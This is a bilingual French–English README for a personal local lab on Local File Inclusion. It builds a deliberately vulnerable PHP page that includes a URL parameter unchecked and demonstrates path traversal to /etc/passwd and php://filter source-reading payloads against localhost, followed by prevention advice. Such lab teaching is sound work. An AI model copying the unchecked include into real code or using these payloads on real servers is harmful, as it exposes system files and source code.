# 🕵️‍♀️ Labo Web Vulnérable – Étape 1 : LFI (Local File Inclusion)

Bienvenue dans mon petit laboratoire de cybersécurité où j'explore des failles classiques du web de manière pédagogique et accessible.

👉 [Lire en français](#-partie-1--en-français) | [Read in English](#-part-2--in-english)

---

## 🇫🇷 Partie 1 – En français

### 📖 Histoire d'une faille : LFI expliquée simplement

Bienvenue dans cette petite aventure où je découvre l’une des failles les plus sournoises du web : **LFI**, ou **Inclusion de Fichier Local**.

Imagine que tu es dans une maison. Tu as le droit d’ouvrir certains **tiroirs** : ceux de ta chambre, par exemple. Mais un jour, tu découvres que si tu modifies un petit paramètre dans l’URL du site… tu peux ouvrir **les tiroirs des autres pièces**, même ceux contenant des informations privées 😮.

C’est exactement ce que fait une faille **LFI** : elle permet de lire des fichiers sensibles du serveur, juste en modifiant une URL.

### 🧱 Mise en place de mon laboratoire sous Kali Linux

#### ✅ 1. Mise à jour du système

```bash
sudo apt update && sudo apt upgrade -y
```

#### ✅ 2. Installation du serveur Apache2

```bash
sudo apt install apache2 -y
sudo systemctl start apache2
sudo systemctl enable apache2
```

Je teste : `http://localhost` → ✅ Apache fonctionne !

#### ✅ 3. Installation de PHP

```bash
sudo apt install php libapache2-mod-php -y
```

#### ✅ 4. Création de mon projet Web

```bash
cd /var/www/html
sudo mkdir web-lab
sudo chown -R $USER:$USER web-lab
cd web-lab
```

Création de `index.php` :

```php
<?php echo '✅ Le lab fonctionne !'; ?>
```

Test dans le navigateur : `http://localhost/web-lab/` → ✅ OK !

### 💣 Création de la faille LFI

Fichier : `lfi.php`

```php
<?php
if (isset($_GET['page'])) {
    include($_GET['page']);
} else {
    echo "Aucune page spécifiée.";
}
?>
```

### 🧪 Tests réalisés

**1. Inclusion d’un fichier local**

```bash
http://localhost/web-lab/lfi.php?page=test.txt
```

**2. Inclusion d’un fichier système**

```bash
http://localhost/web-lab/lfi.php?page=../../../../etc/passwd
```

**3. Lecture du code source (base64)**

```bash
http://localhost/web-lab/lfi.php?page=php://filter/convert.base64-encode/resource=lfi.php
```

### 🚨 Risques identifiés

- Lecture de fichiers système sensibles
- Fuite de code source
- Exécution de code si combinée à un upload malveillant

### 🛡️ Prévention

- Jamais inclure une valeur brute venant de l’utilisateur
- Utiliser une **liste blanche**
- Nettoyer avec `realpath()`, `basename()`, `filter_var()`

### ✅ Ce que j’ai appris

Un simple `include($_GET['page'])` peut exposer tout un serveur.

---

## 🇬🇧 Part 2 – In English

### 📖 LFI explained like a story

Welcome to a little web security adventure. I’m exploring **LFI** (Local File Inclusion), a common and dangerous vulnerability.

Imagine you’re in a house. You’re allowed to open **your drawers**. But one day, you discover a trick that lets you open **other people's drawers**… even the secret ones 😱

That’s what **LFI** does — it lets attackers read server files by abusing an insecure `include()`.

### 🧱 Setting up my lab on Kali Linux

#### ✅ 1. System update

```bash
sudo apt update && sudo apt upgrade -y
```

#### ✅ 2. Apache2 installation

```bash
sudo apt install apache2 -y
sudo systemctl start apache2
sudo systemctl enable apache2
```

I checked: `http://localhost` → ✅ It works!

#### ✅ 3. PHP installation

```bash
sudo apt install php libapache2-mod-php -y
```

#### ✅ 4. Project creation

```bash
cd /var/www/html
sudo mkdir web-lab
sudo chown -R $USER:$USER web-lab
cd web-lab
```

File: `index.php`

```php
<?php echo '✅ The lab works!'; ?>
```

Tested at `http://localhost/web-lab/` → ✅ Success!

### 💣 LFI vulnerability file: `lfi.php`

```php
<?php
if (isset($_GET['page'])) {
    include($_GET['page']);
} else {
    echo "No page specified.";
}
?>
```

### 🧪 Exploitation steps

**1. Including a local file**

```bash
http://localhost/web-lab/lfi.php?page=test.txt
```

**2. Including system file**

```bash
http://localhost/web-lab/lfi.php?page=../../../../etc/passwd
```

**3. Reading source code via base64**

```bash
http://localhost/web-lab/lfi.php?page=php://filter/convert.base64-encode/resource=lfi.php
```

### 🚨 Risks

- Sensitive file disclosure
- Source code leakage
- Code execution if combined with upload

### 🛡️ Protection

- Never include raw user input
- Use a whitelist
- Sanitize input with `realpath()`, `basename()`, `filter_var()`

### ✅ What I’ve learned

Just one `include($_GET['page'])` can expose the whole server.
